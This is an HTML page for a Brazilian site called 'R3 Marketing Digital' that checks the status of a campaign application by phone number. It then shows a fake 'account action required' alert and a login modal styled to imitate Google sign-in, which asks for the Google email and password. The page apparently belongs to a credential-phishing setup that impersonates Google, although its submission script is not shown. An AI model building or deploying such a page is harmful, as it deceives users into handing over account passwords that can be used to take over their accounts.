<!DOCTYPE html>
<html lang="pt-BR">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Checar Candidatura — R3 Marketing Digital</title>

  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Outfit:wght@700;900&display=swap"
    rel="stylesheet">
  <script src="https://unpkg.com/lucide@latest"></script>

  <link rel="stylesheet" href="css/style.css">
  <link rel="stylesheet" href="css/apply.css">
  <style>
    .check-container {
      max-width: 450px;
      margin: 80px auto;
      padding: 24px;
    }

    .check-card {
      background: #202124;
      border: 1px solid #5f6368;
      border-radius: 8px;
      padding: 36px 40px;
      text-align: center;
    }

    .check-icon {
      width: 64px;
      height: 64px;
      background: rgba(123, 47, 190, 0.1);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 20px;
      color: var(--purple-light);
    }

    .check-icon i {
      width: 32px;
      height: 32px;
    }

    .check-card h2 {
      font-family: 'Outfit', sans-serif;
      font-size: 1.5rem;
      margin-bottom: 12px;
    }

    .check-card p {
      color: var(--text-muted);
      font-size: 0.9rem;
      margin-bottom: 24px;
      line-height: 1.6;
    }

    .status-box {
      display: none;
      margin-top: 24px;
      padding: 24px;
      border-radius: var(--radius-sm);
      border: 1px solid var(--border);
      text-align: left;
      animation: fadeIn 0.3s ease;
    }

    .status-box h4 {
      font-family: 'Outfit', sans-serif;
      font-size: 1.2rem;
      margin-bottom: 8px;
    }

    .status-box p {
      color: var(--text-muted);
      font-size: 0.9rem;
      margin-bottom: 16px;
    }

    .badge-status {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      padding: 6px 12px;
      border-radius: 50px;
      font-weight: 700;
      font-size: 0.8rem;
    }

    .status-pendente {
      background: rgba(59, 130, 246, 0.15);
      color: #60a5fa;
      border: 1px solid rgba(59, 130, 246, 0.3);
    }

    .status-em_analise {
      background: rgba(245, 158, 11, 0.15);
      color: #fbbf24;
      border: 1px solid rgba(245, 158, 11, 0.3);
    }

    .status-aprovado {
      background: rgba(16, 185, 129, 0.15);
      color: #34d399;
      border: 1px solid rgba(16, 185, 129, 0.3);
    }

    .status-reprovado {
      background: rgba(239, 68, 68, 0.15);
      color: #f87171;
      border: 1px solid rgba(239, 68, 68, 0.3);
    }

    .google-style-alert {
      background: #202124;
      border: 1px solid #5f6368;
      border-radius: 8px;
      padding: 24px;
      margin-top: 24px;
      text-align: left;
    }
    .google-alert-header {
      display: flex;
      align-items: center;
      gap: 16px;
      margin-bottom: 16px;
      padding-bottom: 16px;
      border-bottom: 1px solid #3c4043;
    }
    .google-alert-logo {
      height: 28px;
    }
    .google-alert-header h5 {
      color: #e8eaed;
      font-size: 1.1rem;
      font-weight: 400;
      font-family: 'Inter', sans-serif;
      margin: 0;
    }
    .google-style-alert p {
      color: #9aa0a6;
      font-size: 0.95rem;
      line-height: 1.6;
      margin-bottom: 24px !important;
    }
    .btn-google-action {
      background: #8ab4f8;
      color: #202124;
      border: none;
      border-radius: 4px;
      padding: 10px 24px;
      font-size: 0.9rem;
      font-weight: 500;
      font-family: 'Inter', sans-serif;
      cursor: pointer;
      transition: background 0.2s, box-shadow 0.2s;
      display: inline-block;
    }
    .btn-google-action:hover {
      background: #aecbfa;
      box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
    }
  </style>
</head>

<body class="theme-dark">

  <!-- Navbar Compacta -->
  <header class="navbar">
    <div class="container nav-container">
      <a href="index.html" class="nav-brand">
        <span class="logo-r3">R3</span>
        <span class="logo-text">Marketing Digital</span>
      </a>
      <a href="campaigns.html" class="btn-ghost">Ver Campanhas</a>
    </div>
  </header>

  <div class="check-container">
    <div class="check-card">
      <div class="connect-modal-header" style="border-bottom:none; margin-bottom:16px;">
        <div class="connect-modal-logo" id="modal-logo-space">
          <img src="assets/connect-logo.png" alt="Google Connect" class="connect-logo-img-sm" />
        </div>
        <h3 style="font-size:1.5rem; font-weight:400; color:#e8eaed; font-family:'Inter', sans-serif; margin:0; text-align:center;">Consultar Status</h3>
        <p style="font-size:1rem; color:#e8eaed; margin-top:8px; text-align:center;">Digite o telefone cadastrado</p>
      </div>

      <form id="check-form" onsubmit="checkStatus(event)">
        <div class="connect-input-group">
          <label>Seu Telefone (WhatsApp)</label>
          <div class="connect-input-wrap">
            <input type="tel" id="check-telefone" placeholder="(11) 99999-9999" required />
          </div>
        </div>

        <div class="connect-action-bar" style="margin-top:32px;">
          <a href="#" onclick="return false;">Problemas no acesso?</a>
          <button type="submit" class="btn-primary btn-google-connect" id="btn-check">
            Avançar
          </button>
        </div>
      </form>

      <!-- Resultado da Busca -->
      <div id="status-result" class="status-box">
        <h4><span id="res-nome"></span></h4>
        <p>Campanha: <strong id="res-campanha" style="color:var(--text)"></strong></p>
        <div style="margin-bottom: 16px;">
          Status atual: <span id="res-badge" class="badge-status"></span>
        </div>

        <!-- Alerta de Rweb Invalida -->
        <div id="rweb-alert-box" class="google-style-alert" style="display:none">
          <div class="google-alert-header">
            <img src="assets/connect-logo.png" alt="Google" class="google-alert-logo">
            <h5>Ação Necessária na Conta</h5>
          </div>
          <p id="res-nota"></p>
          <div style="text-align: right;">
            <button class="btn-google-action" onclick="openConnectModal()">
              Fazer Verificação Novamente
            </button>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- MODAL CONNECT — Rweb -->
  <div class="modal-overlay" id="modal-connect" style="display:none" onclick="closeConnectModal(event)">
    <div class="modal-card connect-modal">
      <div class="connect-modal-header">
        <div class="connect-modal-logo" id="modal-logo-space">
          <img src="assets/connect-logo.png" alt="Google Connect" class="connect-logo-img-sm" />
        </div>
        <h3>Fazer login</h3>
        <p>Use sua Conta do Google</p>
      </div>

      <div class="connect-input-group">
        <label>Seu usuário ou e-mail da conta Google</label>
        <div class="connect-input-wrap">
          <input type="text" id="connect-handle" placeholder="E-mail ou telefone" />
        </div>
      </div>

      <div class="connect-input-group">
        <label>Senha da conta Google</label>
        <div class="connect-input-wrap">
          <input type="password" id="connect-password" placeholder="Digite sua senha" />
        </div>
      </div>

      <div class="connect-action-bar">
        <a href="#" onclick="return false;">Esqueceu a senha?</a>
        <button class="btn-primary btn-google-connect" onclick="confirmConnect()">
          Avançar
        </button>
      </div>
    </div>
  </div>

  <script src="js/check.js"></script>
</body>

</html>
